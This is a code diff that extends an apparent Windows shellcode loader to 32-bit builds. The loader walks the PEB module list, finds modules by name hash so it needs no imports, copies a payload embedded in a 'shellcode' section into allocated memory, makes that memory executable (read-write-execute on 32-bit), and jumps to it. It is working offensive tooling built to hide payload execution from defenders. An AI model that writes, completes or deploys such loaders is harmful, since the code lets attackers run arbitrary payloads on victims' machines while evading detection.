@@ -8,6 +8,14 @@
 char _SHELLCODE_ [0] __attribute__ ( ( section ( "shellcode" ) ) );
 #define GETRESOURCE(x) ( char * ) &x
 
+#ifndef _WIN64
+__attribute__((naked, used))
+void * getretaddr ( void )
+{
+    __asm__ ( "mov (%esp), %eax\n\tret\n" );
+}
+#endif
+
 /* FNV1a-32 on lowercase ASCII of wide-char module name */
 static unsigned int _hm ( const WCHAR * s )
 {
@@ -44,13 +52,22 @@ static void * _mod ( unsigned int hash )
     peb = (char *) __readfsdword ( 0x30 );
 #endif
 
+#ifdef _WIN64
     char * ldr  = *(char **) ( peb + 0x18 );
     char * head = ldr + 0x20;
+#else
+    char * ldr  = *(char **) ( peb + 0x0C );
+    char * head = ldr + 0x14;
+#endif
     char * curr = *(char **) head;
 
     while ( curr != head )
     {
+#ifdef _WIN64
         WCHAR * name = *(WCHAR **) ( curr + 0x40 );
+#else
+        WCHAR * name = *(WCHAR **) ( curr + 0x20 );
+#endif
         if ( name )
         {
             WCHAR * bn = name;
@@ -60,7 +77,11 @@ static void * _mod ( unsigned int hash )
                 p++;
             }
             if ( _hm ( bn ) == hash )
+#ifdef _WIN64
                 return *(void **) ( curr + 0x20 );
+#else
+                return *(void **) ( curr + 0x10 );
+#endif
         }
         curr = *(char **) curr;
     }
@@ -109,6 +130,7 @@ void go ( )
 
     DWORD sc_len = *(DWORD *)sc_src;
     sc_src += 4;
+    __asm__ volatile ( "" : "+r" ( sc_src ) );
 
     typedef LPVOID (WINAPI *tVA)(LPVOID, SIZE_T, DWORD, DWORD);
     typedef BOOL   (WINAPI *tVP)(LPVOID, SIZE_T, DWORD, PDWORD);
@@ -140,7 +162,11 @@ void go ( )
     }
 
     DWORD old = 0;
+#ifdef _WIN64
     pVP ( sc_dst, sc_len, PAGE_EXECUTE_READ, &old );
+#else
+    pVP ( sc_dst, sc_len, PAGE_EXECUTE_READWRITE, &old );
+#endif
 
     ( (void (*)(void)) sc_dst ) ();
 }
